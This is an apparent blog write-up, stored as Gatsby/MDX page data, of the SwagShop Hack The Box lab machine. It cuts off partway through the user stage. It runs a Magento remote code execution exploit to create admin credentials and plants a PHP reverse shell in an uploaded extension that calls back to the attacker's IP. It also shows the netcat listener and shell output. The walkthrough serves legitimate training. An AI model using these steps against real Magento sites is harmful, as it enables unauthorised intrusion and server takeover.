{"componentChunkName":"component---node-modules-narative-gatsby-theme-novela-src-templates-article-template-tsx","path":"/SwagShop-Hack-The-Box-Writeup","result":{"data":{"allSite":{"edges":[{"node":{"siteMetadata":{"name":"SecBytes"}}}]}},"pageContext":{"article":{"id":"f40b36c8-8b4e-5be7-9e35-b4dbf89d41e4","slug":"/SwagShop-Hack-The-Box-Writeup","secret":false,"title":"SwagShop Hack The Box Writeup","author":"Bad3r","date":"September 28th, 2019","dateForSEO":"2019-09-28T00:00:00.000Z","timeToRead":2,"excerpt":"Complete walkthrough for SwagShop on Hack The Box","canonical_url":null,"subscription":true,"body":"function _extends() { _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }\n\nfunction _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i < sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) >= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }\n\nfunction _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i < sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) >= 0) continue; target[key] = source[key]; } return target; }\n\n/* @jsx mdx */\nvar _frontmatter = {\n  \"title\": \"SwagShop Hack The Box Writeup\",\n  \"author\": \"Bad3r\",\n  \"date\": \"2019-09-28T00:00:00.000Z\",\n  \"hero\": \"./images/SwagShop_Hack_The_Box_Walkthrough.jpg\",\n  \"excerpt\": \"Complete walkthrough for SwagShop on Hack The Box\"\n};\n\nvar makeShortcode = function makeShortcode(name) {\n  return function MDXDefaultShortcode(props) {\n    console.warn(\"Component \" + name + \" was not imported, exported, or provided by MDXProvider as global scope\");\n    return mdx(\"div\", props);\n  };\n};\n\nvar layoutProps = {\n  _frontmatter: _frontmatter\n};\nvar MDXLayout = \"wrapper\";\nreturn function MDXContent(_ref) {\n  var components = _ref.components,\n      props = _objectWithoutProperties(_ref, [\"components\"]);\n\n  return mdx(MDXLayout, _extends({}, layoutProps, props, {\n    components: components,\n    mdxType: \"MDXLayout\"\n  }), mdx(\"p\", null, \"This post documents the complete walkthrough of SwagShop, an active vulnerable VM created by \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://www.hackthebox.eu/home/users/profile/1\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"ch4p\"), \" and hosted at \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://www.hackthebox.eu/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Hack The Box\")), mdx(\"table\", null, mdx(\"thead\", {\n    parentName: \"table\"\n  }, mdx(\"tr\", {\n    parentName: \"thead\"\n  }, mdx(\"th\", _extends({\n    parentName: \"tr\"\n  }, {\n    \"align\": null\n  }), \"Description\"))), mdx(\"tbody\", {\n    parentName: \"table\"\n  }, mdx(\"tr\", {\n    parentName: \"tbody\"\n  }, mdx(\"td\", _extends({\n    parentName: \"tr\"\n  }, {\n    \"align\": null\n  }), mdx(\"em\", {\n    parentName: \"td\"\n  }, \"SwagShop\"), \" is a retired GNU/Linux eCommerce web server using an outdated/unpatched version of \", mdx(\"inlineCode\", {\n    parentName: \"td\"\n  }, \"Magento\"), \" with known vulnerabilities and exploits. The Linux system allows the \", mdx(\"inlineCode\", {\n    parentName: \"td\"\n  }, \"Apache\"), \" user to run a sudo command with no password required, allowing privilege escalation to root.\")))), mdx(\"h3\", {\n    \"id\": \"❯-information-gathering\"\n  }, \"\\u276F Information Gathering\"), mdx(\"p\", null, \"Starting with a \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Nmap\"), \" scan\"), mdx(\"p\", null, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://notes.secbytes.net/information-gathering/nmap\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Nmap cheat sheet\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022\\u279C nmap -sV -sC -oA namp 10.10.10.140\\n...\\n \\u2514> PORT   STATE SERVICE VERSION \\n    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) \\n    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) \\n    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu)) \\n    |_http-server-header: Apache/2.4.18 (Ubuntu) \\n    |_http-title: Home page Service Info: OS: Linux; \\n\")), mdx(\"p\", null, \"From the SSH flag, we guessed this box to be \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://launchpad.net/ubuntu/+source/openssh/1:7.2p2-4ubuntu2.8\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Ubuntu Xenial\"), \" and \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Nmap\"), \" finds \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"80/tcp\"), \" open.\"), mdx(\"h3\", {\n    \"id\": \"❯-web-pages-enumeration\"\n  }, \"\\u276F Web Pages Enumeration\"), mdx(\"p\", null, \"Going to \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"http://10.10.10.140\"), \" in the browser\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"683px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"62.22547584187408%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAA7UlEQVQoz52Ry46CMBRA+f/PGN250h0mupiVE9FEogmiCZNYwAhtSR9AxVYv4J7qSW56Fz29jzqa3szWvZ0O5+g/ieMoioqieNrhaHzVv5PstN/tD9vNJgiCXjbGDMvtveeXOIJzdEFpkiCECKGWNd9yXVUY59AqIYQxJoRomsZ0DMsgZFnGGE/TK85zSqm6320rQxzD0PM8aLeqoY+qLCXnvFbKTj6G67VntG46Hj36YSWv/lbT2RQSWcqyQ8g2gfnhkQHZ9/3FYgkLUgrmbYHDZm2t7Lrzn9EYEs647GpCwPxWbcN6MCYf/XDPC0VwuxlsySgFAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/bfff34f3694a1d39da245647366b7f29/aa8f6/htb_swagshop_web.webp 683w\"],\n    \"sizes\": \"(max-width: 683px) 100vw, 683px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/bfff34f3694a1d39da245647366b7f29/08552/htb_swagshop_web.png 683w\"],\n    \"sizes\": \"(max-width: 683px) 100vw, 683px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/bfff34f3694a1d39da245647366b7f29/08552/htb_swagshop_web.png\",\n    \"alt\": \"htb_swagshop_web.png\",\n    \"title\": \"htb_swagshop_web.png\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"we find a \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Magento\"), \" shop with some HTB swag available.The pages are copyrighted from 2014, We can see at \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://www.cloudways.com/blog/magento-versions/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"this\"), \" page that the last released version in 2014 was 1.9.x.\"), mdx(\"p\", null, \"Browsing around, you will notice that the items are placed under a folder called \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"index.php/\"), \" (\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"http://10.10.10.140/index.php/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"http://10.10.10.140/index.php/\"), \")\"), mdx(\"p\", null, \"by running two \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"GoBuster\"), \" scans on \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"http://10.10.10.140/\"), \" and \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"http://10.10.10.140/index.php/\"), \" we find the admin panel at \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"http://10.10.10.140/index.php/admin/\"), \" \"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1380px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"35.14492753623188%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABVUlEQVQY0yWQyWocQRBE+//1Db775OVmHyywMMgyQmANo1k8Pb2qtq69KmvpkoRKchAkcYjkJdnEEKy1LkafEuRcHdY1vAcJwJ3j3gsAEYKMSaas1iLLs81rSrEx1vbTFF5ekFIdRiNj+75r5/m+bY+UDca2QuzmcXPY3v29+XP94/fl16svH/a3P8vTcwNa09NJxzBivG87oox0sBgzLYIa185o1/UjZT3Cp2HYn/vN7nB39b3b3K7lqUkpA0fyfKPZ7IwMViWwDoILwTjPlVL1Ng81S+MMm+zjYUCICJlzblLOHry2xghsWOf4KMmZcM6kFEpJrYTWhC/jPB7+HbeXHx8+X/z69um4vS+lVHICCCGmtJa4FgfReK+0MkZXW2e0lmxhwzwd2/Oun0+PfCKMS/VOTikAvD3cuYrHCDFKCSGUUowxY6zOhf0X9c7Wdu1X1cVXc8iAdXty5NgAAAAASUVORK5CYII=')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/a1ab70a67e7399044f81c8a25ed2ff06/a305d/admin_login.webp 1380w\"],\n    \"sizes\": \"(max-width: 1380px) 100vw, 1380px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/a1ab70a67e7399044f81c8a25ed2ff06/23a08/admin_login.png 1380w\"],\n    \"sizes\": \"(max-width: 1380px) 100vw, 1380px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/a1ab70a67e7399044f81c8a25ed2ff06/23a08/admin_login.png\",\n    \"alt\": \"admin_login.png\",\n    \"title\": \"admin_login.png\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"And \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"http://10.10.10.140/downloader/\"), \" to access \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Magento\"), \" Connect Manager. You can upload new\\n\", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Magento\"), \" packages, which contains PHP files inside.\\n\", mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1508px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"66.9761273209549%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABL0lEQVQoz2PQcvLUc/PRcfXWcnRTN9bXNNZTMzFSsXWRt3QQMTDHikQNLfi0jYy9Axkqeib1L1g6YeGytqkzWpsrOppLG9saeuYubpg0PaOuNbO+DRNlNbSn1jTX9E9l+PPnz28Q+v3n79+/////AaJ//4AiYB4+ANQI0vyfLIBFM5D76dOnb9++/QKD379//4IBTJXomn/8+HHv3r1Xr159/vz5IwwA2V+/fgXqJ6D558+fL1++fPb06ePHj0AASD1+/OTpsy9fvgBdQVjzk8ePX7x4+frT97efvr59/+Ht+49v3n34/JkIzb9+/nz1+vX7t28+Xdn14f6Fj5+/fvz4AehyomwGqgBa/uP7t29Pr3978+THz18/wOD79++ENf+DATQuXITIeP5H20QCAP5PsPiu00uiAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/164a418ba9856475415b6ddfdd4c0bb7/c7b4c/downloader_login.webp 1508w\"],\n    \"sizes\": \"(max-width: 1508px) 100vw, 1508px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/164a418ba9856475415b6ddfdd4c0bb7/4ec8e/downloader_login.png 1508w\"],\n    \"sizes\": \"(max-width: 1508px) 100vw, 1508px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/164a418ba9856475415b6ddfdd4c0bb7/4ec8e/downloader_login.png\",\n    \"alt\": \"downloader_login.png\",\n    \"title\": \"downloader_login.png\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"h3\", {\n    \"id\": \"❯-exploitation\"\n  }, \"\\u276F Exploitation\"), mdx(\"p\", null, \"We use \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"searchsploit\"), \" to find exploits in \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Magneto 1.9.x\"), \" \"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"905px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"39.11602209944751%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7EAAAOxAGVKw4bAAABVklEQVQY002QWXKDMBAFfZF4AWxLIEASCK0g7Nh4i7Pc/zJ5JPlI1RQ1TKmlN71g3DJmadGRXAkxENomaZlkVZpV/7/Ztk6ycpOyTcKSdB7id0F2DaVqtxfLNXlZ7Zcbutrk/2u5pum24rwvS5sXHSsNMMxx0WKr220lKWmlHDgfpIyqPUo5oqlqjyxNM1aVQ6/aQ6deUUodaa5mmLw5qnVVuOBuwd+Du/f+bs1kzcWYSeszyIJp3Z16/4j9M4bncfxCCiSaYeacrAelDlafnbl4e+vUybubs9dGjkiIDY0+D+ExDu+owT/+4N2bESF6fe30CWTbjHgE2bBkXYc9aXAo23HdnYOf4fnx/smYmeFqivUUrbvgqNVIe0U87AmFMA9D66QAbPSE+SF+HuMHGizysiILKSLpTS7Nj0wtBZyNAuZE/JXHecAtXAw/ql4RoW0OgOH8Gw48X+un/KBtAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/7eb81925d7b8163c861c0c069a299151/d7601/searchsploit.webp 905w\"],\n    \"sizes\": \"(max-width: 905px) 100vw, 905px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/7eb81925d7b8163c861c0c069a299151/94d8e/searchsploit.png 905w\"],\n    \"sizes\": \"(max-width: 905px) 100vw, 905px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/7eb81925d7b8163c861c0c069a299151/94d8e/searchsploit.png\",\n    \"alt\": \"searchsploit.png\",\n    \"title\": \"searchsploit.png\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"and we notice a remote code execution exploit\"), mdx(\"table\", null, mdx(\"thead\", {\n    parentName: \"table\"\n  }, mdx(\"tr\", {\n    parentName: \"thead\"\n  }, mdx(\"th\", _extends({\n    parentName: \"tr\"\n  }, {\n    \"align\": null\n  }), \"Exploit Title\"), mdx(\"th\", _extends({\n    parentName: \"tr\"\n  }, {\n    \"align\": null\n  }), \"Path  (/usr/share/exploitdb/)\"))), mdx(\"tbody\", {\n    parentName: \"table\"\n  }, mdx(\"tr\", {\n    parentName: \"tbody\"\n  }, mdx(\"td\", _extends({\n    parentName: \"tr\"\n  }, {\n    \"align\": null\n  }), \"Magento eCommerce - Remote Code Execution\"), mdx(\"td\", _extends({\n    parentName: \"tr\"\n  }, {\n    \"align\": null\n  }), \"exploits/xml/webapps/37977.py\")))), mdx(\"p\", null, \" We need to tweak the exploit a little for the odd \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"$IP/index.php/admin\"), \" requirement instead of \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"$IP/admin\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-Python\"\n  }), \"...\\ntarget = \\\"http://10.10.10.140/\\\"\\n\\nif not target.startswith(\\\"http\\\"):\\n   target = \\\"http://\\\" + target\\n\\nif target.endswith(\\\"/\\\"):\\n   target = target[:-1]\\n\\ntarget_url = target + \\\"/index.php\\\" + \\\"/admin/Cms_Wysiwyg/directive/index/\\\"\\n...\\n\")), mdx(\"p\", null, \"we run the script \"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022 \\u279C python 37977.py  \\n \\u2514> WORKED\\n    Check http://10.10.10.140/admin with creds forme:forme\\n\")), mdx(\"p\", null, \"now we can log in to the admin panel \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"http://10.10.10.140/index.php/admin\"), \" and \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"http://10.10.10.140/downloader\"), \" with creds \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"forme:forme\")), mdx(\"h3\", {\n    \"id\": \"❯-getting-a-reverse-shell\"\n  }, \"\\u276F Getting a Reverse Shell\"), mdx(\"p\", null, \"Using the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Magento\"), \" Downloader/\", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Magento\"), \" Connect, we attempt to upload an\\nextension with a PHP reverse shell.\"), mdx(\"p\", null, \"Download any legit \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Magento\"), \" package, we\\u2019ll use \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"LavaMagentoBD\"), \" from \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/P34C3-07/LavaMagentoBD\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"GitHub/P34C3-07/LavaMagentoBD\"), \" then extract \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"lavamagento_bd.tgz\"), \" we\\u2019ll have to modify its contents.\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022\\u279C tar -xzvf lavalamp_magento_bd.tgz\\n\")), mdx(\"p\", null, \"edit the file \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"./App/code/community/Lavalamp/Connector/controllers/IndexController.php\"), \" and replace its contents with a PHP reverse shell, we\\u2019ll use PHP-Reverse-Shell from \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/pentestmonkey/php-reverse-shell\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Github/pentestmonkey/php-reverse-shell\"), \" make sure to change the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"$IP\"), \" field to your IP address. we will use port \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"1234\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"$ip = '10.10.14.115';  // CHANGE THIS\\n$port = 1234;\\n\")), mdx(\"p\", null, \"get the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"MD5\"), \" hash for the file\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022 \\u279C md5sum ./App/code/community/Lavalamp/Connector/controllers/IndexController.php    \\n\\u2514> 7587816c42712b0c9fe6dccb2c6c5300  IndexController.php\\n\")), mdx(\"p\", null, \"copy it then edit \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"package.xml\"), \" and replace \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"IndexController.php\"), \" hash\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-xml\"\n  }), \"    <dir name=\\\"controllers\\\">\\n        <file hash=\\\"7587816c42712b0c9fe6dccb2c6c5300\\\" \\n              name=\\\"IndexController.php\\\"/>\\n    </dir>\\n\")), mdx(\"p\", null, \"compress the files back into \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \".tgz\"), \" file\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022\\u279C tar -cvzf lavalamp_magento_bd.tgz -c ./*\\n\")), mdx(\"p\", null, \"then upload the file to \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"http://10.10.10.140/downloader/\"), \" login with creds \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"forme:forme\"), \" if the extension is loaded successfully you should see\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1149px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"36.81462140992167%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAXklEQVQY08WOSw6DMAxEPZ8oBlU0gd7/rE04AKXd9GlkefPsCTf5KW8aCwogwOckAnFBZoYPl5fV7G6uZFIPaSEXjiuf5D5/ehcTw2Rl3GPKs+RIOVPBii/kn/mr/AbYBAJqW0VoJgAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/b4f74a195e0f4a0da633e6d5f3c10a09/147f1/uploaded.webp 1149w\"],\n    \"sizes\": \"(max-width: 1149px) 100vw, 1149px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/b4f74a195e0f4a0da633e6d5f3c10a09/52927/uploaded.png 1149w\"],\n    \"sizes\": \"(max-width: 1149px) 100vw, 1149px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/b4f74a195e0f4a0da633e6d5f3c10a09/52927/uploaded.png\",\n    \"alt\": \"uploaded.png\",\n    \"title\": \"uploaded.png\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"start listening using netcat\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022\\u279C nc -v -n -l -p 1234\\n\")), mdx(\"p\", null, \"then in the browser navigate to \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"http://10.10.10.140/app/code/community/Lavalamp/Connector/controllers/IndexController.php\"), \"\\nin the terminal you should see that we got a reverse shell \"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022\\u279C nc -nvlp 1234\\n\\u2514> listening on [any] 1234 ...\\n   connect to [<IP>] from (UNKNOWN) [10.10.10.140] 44650\\n   Linux swagshop 4.4.0-146-generic #172-Ubuntu SMP x86_64 GNU/Linux\\n   13:22:28 up 32 min,  0 users,  load average: 4.31, 2.61, 1.86\\n   USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\\n   uid=33(www-data) gid=33(www-data) groups=33(www-data)\\n   /bin/sh: 0: can't access tty; job control turned off\\n\")), mdx(\"p\", null, \"we  are connected now with the username \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"www-data\"), \", but we still need to spawn a bash shell with tty\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"$ python -c 'import pty; pty.spawn(\\\"/bin/bash\\\")'\\nwww-data@swagshop:/$ \\n\")), mdx(\"h2\", {\n    \"id\": \"❯-own-user\"\n  }, \"\\u276F Own User\"), mdx(\"p\", null, \"Now that we have a shell on the box we can view \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"etc/passwd\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022\\u279C www-data@swagshop:/$ cat 